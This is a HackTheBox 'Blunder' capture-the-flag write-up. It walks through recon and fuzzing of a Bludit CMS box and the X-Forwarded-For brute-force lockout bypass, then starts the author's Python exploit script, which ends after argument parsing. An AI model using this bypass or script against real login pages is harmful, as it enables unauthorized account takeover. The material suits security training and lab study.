@@ -1,0 +1,575 @@
+<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>HackTheBox — Blunder Writeup | ColdFusionX</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Blunder Writeup" /><meta name="author" content="Mayank Deshmukh" /><meta property="og:locale" content="en_US" /><meta name="description" content="Blunder was an cool box with two interdependent web application vulnerabilities, Starting off with Web Enumeration we discover a blog hosted on Bludit CMS, going through Github releases indicates the version is vulnerable to bypass a anti brute force mechanism, along with it a authenticated user can also achieve Remote Code execution via bypassing Image Upload functionality. To commence brute force attack I’ll write my own exploit code and get the credentials. However, Rather than using Metasploit to obtain remote code execution, I’ll do it manually to bypass Image upload filter and get a shell on the box. Furthermore, inside a database config file we creds for another user and pivot to it. For elevating privileges to root, we’ll exploit CVE-2019-14287 aka sudo vulnerability which allows a user to evade security policy and execute command as root even though the user is restricted to do so." /><meta property="og:description" content="Blunder was an cool box with two interdependent web application vulnerabilities, Starting off with Web Enumeration we discover a blog hosted on Bludit CMS, going through Github releases indicates the version is vulnerable to bypass a anti brute force mechanism, along with it a authenticated user can also achieve Remote Code execution via bypassing Image Upload functionality. To commence brute force attack I’ll write my own exploit code and get the credentials. However, Rather than using Metasploit to obtain remote code execution, I’ll do it manually to bypass Image upload filter and get a shell on the box. Furthermore, inside a database config file we creds for another user and pivot to it. For elevating privileges to root, we’ll exploit CVE-2019-14287 aka sudo vulnerability which allows a user to evade security policy and execute command as root even though the user is restricted to do so." /><link rel="canonical" href="http://localhost:4000/posts/Blunder-HTB/" /><meta property="og:url" content="http://localhost:4000/posts/Blunder-HTB/" /><meta property="og:site_name" content="ColdFusionX" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Blunder.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-23T12:20:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Blunder.png" /><meta property="twitter:title" content="HackTheBox — Blunder Writeup" /><meta name="twitter:site" content="@ColdFusionX_" /><meta name="twitter:creator" content="@Mayank Deshmukh" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"HackTheBox — Blunder Writeup","dateModified":"2020-10-23T12:20:00+05:30","datePublished":"2020-10-23T12:20:00+05:30","image":"http://localhost:4000/assets/img/Posts/Blunder.png","url":"http://localhost:4000/posts/Blunder-HTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Blunder-HTB/"},"author":{"@type":"Person","name":"Mayank Deshmukh"},"description":"Blunder was an cool box with two interdependent web application vulnerabilities, Starting off with Web Enumeration we discover a blog hosted on Bludit CMS, going through Github releases indicates the version is vulnerable to bypass a anti brute force mechanism, along with it a authenticated user can also achieve Remote Code execution via bypassing Image Upload functionality. To commence brute force attack I’ll write my own exploit code and get the credentials. However, Rather than using Metasploit to obtain remote code execution, I’ll do it manually to bypass Image upload filter and get a shell on the box. Furthermore, inside a database config file we creds for another user and pivot to it. For elevating privileges to root, we’ll exploit CVE-2019-14287 aka sudo vulnerability which allows a user to evade security policy and execute command as root even though the user is restricted to do so.","@type":"BlogPosting","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox — Blunder Writeup | ColdFusionX</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Blunder Writeup" /><meta name="author" content="Mayank Deshmukh" /><meta property="og:locale" content="en_US" /><meta name="description" content="Blunder was an cool box with two interdependent web application vulnerabilities, Starting off with Web Enumeration we discover a blog hosted on Bludit CMS, going through Github releases indicates the version is vulnerable to bypass a anti brute force mechanism, along with it a authenticated user can also achieve Remote Code execution via bypassing Image Upload functionality. To commence brute force attack I’ll write my own exploit code and get the credentials. However, Rather than using Metasploit to obtain remote code execution, I’ll do it manually to bypass Image upload filter and get a shell on the box. Furthermore, inside a database config file we creds for another user and pivot to it. For elevating privileges to root, we’ll exploit CVE-2019-14287 aka sudo vulnerability which allows a user to evade security policy and execute command as root even though the user is restricted to do so." /><meta property="og:description" content="Blunder was an cool box with two interdependent web application vulnerabilities, Starting off with Web Enumeration we discover a blog hosted on Bludit CMS, going through Github releases indicates the version is vulnerable to bypass a anti brute force mechanism, along with it a authenticated user can also achieve Remote Code execution via bypassing Image Upload functionality. To commence brute force attack I’ll write my own exploit code and get the credentials. However, Rather than using Metasploit to obtain remote code execution, I’ll do it manually to bypass Image upload filter and get a shell on the box. Furthermore, inside a database config file we creds for another user and pivot to it. For elevating privileges to root, we’ll exploit CVE-2019-14287 aka sudo vulnerability which allows a user to evade security policy and execute command as root even though the user is restricted to do so." /><link rel="canonical" href="http://localhost:4000/posts/Blunder-HTB/" /><meta property="og:url" content="http://localhost:4000/posts/Blunder-HTB/" /><meta property="og:site_name" content="ColdFusionX" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Blunder.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-23T12:20:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Blunder.png" /><meta property="twitter:title" content="HackTheBox — Blunder Writeup" /><meta name="twitter:site" content="@ColdFusionX_" /><meta name="twitter:creator" content="@Mayank Deshmukh" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"HackTheBox — Blunder Writeup","dateModified":"2020-10-23T12:20:00+05:30","datePublished":"2020-10-23T12:20:00+05:30","image":"http://localhost:4000/assets/img/Posts/Blunder.png","url":"http://localhost:4000/posts/Blunder-HTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Blunder-HTB/"},"author":{"@type":"Person","name":"Mayank Deshmukh"},"description":"Blunder was an cool box with two interdependent web application vulnerabilities, Starting off with Web Enumeration we discover a blog hosted on Bludit CMS, going through Github releases indicates the version is vulnerable to bypass a anti brute force mechanism, along with it a authenticated user can also achieve Remote Code execution via bypassing Image Upload functionality. To commence brute force attack I’ll write my own exploit code and get the credentials. However, Rather than using Metasploit to obtain remote code execution, I’ll do it manually to bypass Image upload filter and get a shell on the box. Furthermore, inside a database config file we creds for another user and pivot to it. For elevating privileges to root, we’ll exploit CVE-2019-14287 aka sudo vulnerability which allows a user to evade security policy and execute command as root even though the user is restricted to do so.","@type":"BlogPosting","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">ColdFusionX</a></div><div class="site-subtitle font-italic">CTF Player | Pentester | InfoSec Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/ColdFusionX" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/ColdFusionX_" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['coldfusionx','outlook.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://app.hackthebox.com/profile/163155" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/b3t4m3/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox — Blunder Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox — Blunder Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Oct 23, 2020, 12:20 PM +0530" > Oct 23, 2020 <i class="unloaded">2020-10-23T12:20:00+05:30</i> </span> by <span class="author"> Mayank Deshmukh </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Oct 23, 2020, 6:42 PM +0530" > Oct 23, 2020 <i class="unloaded">2020-10-23T18:42:16+05:30</i> </span></div></div><div class="post-content"> <img src="/assets/img/Posts/Blunder.png" class="post-preview-img"><blockquote><p>Blunder was an cool box with two interdependent web application vulnerabilities, Starting off with Web Enumeration we discover a blog hosted on Bludit CMS, going through Github releases indicates the version is vulnerable to bypass a anti brute force mechanism, along with it a authenticated user can also achieve Remote Code execution via bypassing Image Upload functionality. To commence brute force attack I’ll write my own exploit code and get the credentials. However, Rather than using Metasploit to obtain remote code execution, I’ll do it manually to bypass Image upload filter and get a shell on the box. Furthermore, inside a database config file we creds for another user and pivot to it. For elevating privileges to root, we’ll exploit CVE-2019-14287 aka sudo vulnerability which allows a user to evade security policy and execute command as root even though the user is restricted to do so.</p></blockquote><h2 id="recon">Recon</h2><p>Let’s start off with <code class="language-plaintext highlighter-rouge">masscan</code> and <code class="language-plaintext highlighter-rouge">nmap</code> to discover open ports and services:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span>,U:1-65535 10.10.10.191 <span class="nt">--rate</span> 500 | <span class="nb">tee </span>masscan.ports
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-10-21 16:16:26 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>131070 ports/host]
+Discovered open port 80/tcp on 10.10.10.191
+
+cfx:  ~/Documents/htb/blunder
+→ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span> 10.10.10.191
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-21 22:36 IST
+Nmap scan report <span class="k">for </span>10.10.10.191
+Host is up <span class="o">(</span>0.30s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Blunder | A blunder of interesting facts
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.78 seconds
+</pre></table></code></div></div><p>Only Port 80 was discovered, From <code class="language-plaintext highlighter-rouge">nmap</code> output we see HTTP service is running with Apache 2.4.41, and title as <strong>A blunder of interesting facts</strong>.</p><h3 id="port-80---http">Port 80 - HTTP</h3><h4 id="blog">Blog</h4><p>On the first look it seems it’s displaying some kind of blog.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/website.png" alt="website" /></p><p>Except three posts from the author and an about page, we don’t find anything interesting. Apart from that I saw the webpage running PHP on my <strong>Wappalyzer</strong> extension.</p><h4 id="web-fuzzing">Web Fuzzing</h4><p>We’ll use <code class="language-plaintext highlighter-rouge">ffuf</code> to fuzz website for hidden directories and files, I’ll also include extension check for <code class="language-plaintext highlighter-rouge">.php &amp; .txt</code> files.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://10.10.10.191/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt <span class="nt">-e</span> .php,.txt <span class="nt">-fc</span> 403
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.191/FUZZ
+ :: Extensions       : .php .txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 403
+________________________________________________
+
+admin                   [Status: 200, Size: 2385, Words: 106, Lines: 71]
+install.php             [Status: 200, Size: 30, Words: 5, Lines: 1]
+about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
+0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]
+robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
+todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
+LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]
+usb                     [Status: 200, Size: 3959, Words: 304, Lines: 111]
+:: Progress: [60348/60348] :: Job [1/1] :: 84 req/sec :: Duration: [0:11:50] :: Errors: 0 ::
+</span></pre></table></code></div></div><h3 id="admin">Admin</h3><p>Visiting <a href="http://10.10.10.191/admin">http://10.10.10.191/admin</a> leads us to <code class="language-plaintext highlighter-rouge">/admin/</code> login page for <a href="https://www.bludit.com/"><strong>Bludit</strong></a>:</p><blockquote><p>Bludit is a web application to build your own website or blog in seconds, it’s completely free and open source. Bludit uses files in JSON format to store the content, you don’t need to install or configure a database. You only need a web server with PHP support.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/login.png" alt="login" /></p><h3 id="installphp">install.php</h3><p><a href="http://10.10.10.191/install.php">http://10.10.10.191/install.php</a> says Bludit is already installed.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ curl http://10.10.10.191/install.php
+Bludit is already installed <span class="p">;</span><span class="o">)</span>
+</pre></table></code></div></div><h3 id="todotxt">todo.txt</h3><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ curl http://10.10.10.191/todo.txt
+<span class="nt">-Update</span> the CMS
+<span class="nt">-Turn</span> off FTP - DONE
+<span class="nt">-Remove</span> old <span class="nb">users</span> - DONE
+<span class="nt">-Inform</span> fergus that the new blog needs images - PENDING
+</pre></table></code></div></div><p>Two important things to note from this <code class="language-plaintext highlighter-rouge">todo.txt</code> :</p><ul><li>CMS has not been updated, a hint to check on Bludit CMS vulnerabilities.</li><li>Inform fergus, seems we have a potential username <code class="language-plaintext highlighter-rouge">fergus</code></li></ul><h2 id="bludit-vulnerabilities">Bludit Vulnerabilities</h2><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ searchsploit bludit
+<span class="nt">-----------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                     |  Path
+<span class="nt">-----------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Bludit - Directory Traversal Image File Upload <span class="o">(</span>Metasploit<span class="o">)</span>                        | php/remote/47699.rb
+bludit Pages Editor 3.0.0 - Arbitrary File Upload                                  | php/webapps/46060.txt
+<span class="nt">-----------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</pre></table></code></div></div><p>Although <code class="language-plaintext highlighter-rouge">Metasploit</code> exploit looks promising, Rather than auto exploiting using Metasploit, lets do it manually. Also we still are not sure whether these are applicable to us since we don’t know the version of Bludit.</p><h3 id="version-hunt">Version Hunt</h3><p>While trying ``admin:admin` credential on login page, inside the network section of Inspect element I noticed some CSS &amp; JS files are loading, all of them showcasing some version 3.9.2.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/network.png" alt="network" /></p><p>On <a href="https://github.com/bludit/bludit/search?q=bootstrap.min.css%3Fversion"><strong>searching</strong></a> for <code class="language-plaintext highlighter-rouge">bootstrap.min.css?version</code> inside bludit repository, we understand it’s the Bludit Version that is being disclosed.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/version.png" alt="version" /></p><p>Great, so we are running <code class="language-plaintext highlighter-rouge">Bludit Version : 3.9.2</code></p><h3 id="research">Research</h3><p>A good approach is to always look at <strong>Github issues</strong> while hunting for vulnerabilities.</p><p>Some quick google search on <strong>Bludit cms issues</strong> leads us to <a href="https://github.com/bludit/bludit/issues/1081">https://github.com/bludit/bludit/issues/1081</a> describing Bludit 3.9.2 has a vulnerability in Image upload functionality leading to Remote Code Execution, but it requires authentication.</p><h2 id="brute-forcing-creds">Brute-forcing Creds</h2><p>I found a <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/"><strong>post by Rastating</strong></a> explaining a vulnerability on Bludit CMS where Bludit version 3.9.2 and prior are vulnerable to bypass a anti-brute force mechanism which tracks the User’s IP. This brute force mechanism blocks the user’s IP which has attempted to incorrectly login 10 times or more.</p><p>It takes the IP from <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header, sole reason behind trusting this header is to determine the IP address of end users who are accessing the website behind a proxy, which avoids banning all members with same IP address behind a proxy. However, no validation is carried out to ensure they are valid IP addresses, meaning that an attacker can use any arbitrary value and not risk being locked out.</p><p>As the end user can control it, if we can change it on every login attempt with some random value, we are good to brute force the login page for valid credentials.</p><h3 id="prerequisites">Prerequisites</h3><p>Since we already have a username <code class="language-plaintext highlighter-rouge">fergus</code> from todo.txt, we’ll use the same to brute force.</p><h4 id="wordlist">Wordlist</h4><p>Rather than jumping to <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, we can first try a wordlist generated from the website itself, Using <code class="language-plaintext highlighter-rouge">cewl</code> we can generate a custom wordlist from the site and name it as <code class="language-plaintext highlighter-rouge">pass.txt</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ cewl http://10.10.10.191 <span class="o">&gt;</span> pass.txt
+</pre></table></code></div></div><p>I’ll the remove cewl banner from the list which leaves us with 349 words.</p><h3 id="exploitpy">Exploit.py</h3><p>Rastating has already given a POC script, but the vanilla version of the script can’t be used to brute-force in this case.</p><p>With reference to the original script, I created a exploit of my own which can be found <a href="https://github.com/ColdFusionX/CVE-2019-17240-Exploit-Bludit-BF-bypass"><strong>here</strong></a> where I have showcased the exploit usage in detail.</p><p>The exploit takes three user inputs <code class="language-plaintext highlighter-rouge">login url, user.txt and pass.txt</code> where user.txt contains the potential list of usernames to be used in brute force (fergus in our case), pass.txt is the dictionary of passwords. For <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header the scripts inputs values from the pass.txt and also tells if any word gets blocked during brute force by the site.</p><h4 id="exploit-code">Exploit Code</h4><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+</pre><td class="rouge-code"><pre><span class="c1">#Author: ColdFusionX (Mayank Deshmukh)
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">argparse</span><span class="p">,</span> <span class="n">textwrap</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#Expected Arguments
+</span><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">"Bludit &lt;= 3.9.2 Auth Bruteforce Mitigation Bypass"</span><span class="p">,</span> <span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="p">.</span><span class="n">RawTextHelpFormatter</span><span class="p">,</span>
+<span class="n">epilog</span><span class="o">=</span><span class="n">textwrap</span><span class="p">.</span><span class="n">dedent</span><span class="p">(</span><span class="s">'''
+Exploit Usage :
+./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
+./exploit.py -l http://127.0.0.1/admin/login.php -u /Directory/user.txt -p /Directory/pass.txt'''</span><span class="p">))</span>
+
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-l"</span><span class="p">,</span><span class="s">"--url"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Path to Bludit (Example: http://127.0.0.1/admin/login.php)"</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-u"</span><span class="p">,</span><span class="s">"--userlist"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Username Dictionary"</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-p"</span><span class="p">,</span><span class="s">"--passlist"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Password Dictionary"</span><span class="p">)</span>
